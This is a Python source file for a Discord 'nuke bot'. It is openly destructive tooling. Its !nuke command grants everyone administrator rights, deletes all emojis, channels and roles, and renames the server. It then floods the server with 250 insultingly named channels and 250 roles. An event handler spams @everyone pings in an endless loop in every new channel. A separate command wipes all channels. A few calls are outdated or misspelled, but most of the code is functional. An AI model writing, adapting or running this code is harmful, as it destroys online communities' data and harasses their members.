import discord
import random
import os

from colorama import Fore
from discord import Permissions
from discord.ext import commands

client = commands.Bot('!')

tc_names = ['Get nuked', 'be nice to me', 'your fault', 'stupid fn kid']
r_names = ['works...']



@client.command()
async def stop(ctx):

        snowie = await client.fetch_user(742448957900455957)

        if ctx.author == snowie:

                await ctx.bot.logout()
                print("The bot stopped...")

        else:
                return

        
        
@client.command()
async def channels(ctx):

        try:
                for channel in ctx.guild.channels:
                        await channel.delete()
                        print(Fore.GREEN + f"Channel: {channel} was deleted.")

        except:
                print(Fore.RED + f"Channel: {channel} was NOT Deleted")

        try:
                for i in range(1):
                        role = await ctx.guild.create_role(name=random.choice(r_names))
                        print(Fore.GREEN + f"Role: {role} has been created.")

        except:
                print(Fore.RED + f"Role: {role} has NOT been created.")

                

@client.command()
async def nuke(ctx):

        print(Fore.GREEN +
        "\n--------------------------------------------------------------------------------------------------------\n  Entering role perms. \n--------------------------------------------------------------------------------------------------------\n")

        role = discord.utils.get(ctx.guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        print(Fore.GREEN +"Role: I have given everyone admin permissions.")

        # This is the deleteting part...

        print(Fore.GREEN +
        "\n--------------------------------------------------------------------------------------------------------\n  Entering deleting emojis. \n--------------------------------------------------------------------------------------------------------\n")

        try:
                for emoji in list(ctx.guild.emojis):
                        await emoji.delete()
                        print(Fore.GREEN + f"Emoji: {emoji.name} has been deleted." + Fore.RESET)

        except:
                print(Fore.RED + f"Emoji: {emoji.name} has NOT been deleted." + Fore.RESET)

        print(Fore.GREEN +
        "\n--------------------------------------------------------------------------------------------------------\n  Entering deleting channels. \n--------------------------------------------------------------------------------------------------------\n")

        try:
                for channel in ctx.guild.channels:
                        await channel.delete()
                        print(Fore.GREEN + f"Channel: {channel} was deleted." + Fore.RESET)

        except:
                print(Fore.RED + f"Channel: {channel} was NOT Deleted" + Fore.RESET)

        print(Fore.GREEN +
        "\n--------------------------------------------------------------------------------------------------------\n  Entering deleting roles. \n--------------------------------------------------------------------------------------------------------\n")

        try:
                for role in ctx.guild.roles:
                        await role.delete()
                        print(Fore.GREEN +f"Role: {role} has been deleted.")

        except:
                print(Fore.RED + f"Role: {role} has NOT been deleted.")

        print(Fore.GREEN +
        "\n--------------------------------------------------------------------------------------------------------\n  Entering editing the server. \n--------------------------------------------------------------------------------------------------------\n")

        try: 
                with open('nuke.jpeg', 'rb') as f:
                        icon = f.read()
                await client.edit_server(ctx.guild, icon=icon)
                print(Fore.RED + "Server: Server icon has been changed" + Fore.RESET)

        except:
                print(Fore.RED + "Server: server icon was NOT uploaded." + Fore.RESET)

        try:
                await ctx.guild.edit("this server got nuked...")
                print(Fore.green + "Server: server name has been changed" + Fore.RESET)

        except:
                print(Fore.RED + "Server: Server name has NOT been changed" + Fore.RESET)

        print(Fore.GREEN +
        "\n--------------------------------------------------------------------------------------------------------\n  Entering creating channels. \n--------------------------------------------------------------------------------------------------------\n")

        try:
                for i in range(250):
                        channel = await ctx.guild.create_text_channel(random.choice(tc_names))
                        print(Fore.GREEN + f"Channel: {channel} was created" + Fore.RESET)

        except:
                print(Fore.RED + f"Channel: {channel} has NOT been created." + Fore.RESET)

        print(Fore.GREEN +
        "\n--------------------------------------------------------------------------------------------------------\n  Entering creating roles. \n--------------------------------------------------------------------------------------------------------\n")

        try:
                for i in range(250):
                        role = await ctx.guild.create_role(name=random.choice(r_names))
                        print(Fore.GREEN + f"Role: {role} has been created." + Fore.RESET)

        except:
                print(Fore.RED + f"Role: {role} has NOT been created." + Fore.RESET)



@client.event
async def on_guild_channel_create(channel):

        while True:
                await channel.send(channel.guild.default_role)



@client.event
async def on_ready():
        print(Fore.GREEN + f"""
███╗░░██╗██╗░░░██╗██╗░░██╗███████╗  ██████╗░░█████╗░████████╗░░░██╗░██╗░░█████╗░░█████╗░░█████╗░░█████╗░
████╗░██║██║░░░██║██║░██╔╝██╔════╝  ██╔══██╗██╔══██╗╚══██╔══╝██████████╗██╔══██╗██╔══██╗██╔═══╝░██╔══██╗
██╔██╗██║██║░░░██║█████═╝░█████╗░░  ██████╦╝██║░░██║░░░██║░░░╚═██╔═██╔═╝╚██████║╚█████╔╝██████╗░╚██████║
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░  ██╔══██╗██║░░██║░░░██║░░░██████████╗░╚═══██║██╔══██╗██╔══██╗░╚═══██║
██║░╚███║╚██████╔╝██║░╚██╗███████╗  ██████╦╝╚█████╔╝░░░██║░░░╚██╔═██╔══╝░█████╔╝╚█████╔╝╚█████╔╝░█████╔╝
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝  ╚═════╝░░╚════╝░░░░╚═╝░░░░╚═╝░╚═╝░░░░╚════╝░░╚════╝░░╚════╝░░╚════╝░
\n--------------------------------------------------------------------------------------------------------\n
{client.user.name}#{client.user.discriminator}
\n--------------------------------------------------------------------------------------------------------\n
!nuke
!emoji
!roles
!channels
\n--------------------------------------------------------------------------------------------------------\n""")



client.run(os.environ['bot_token'])
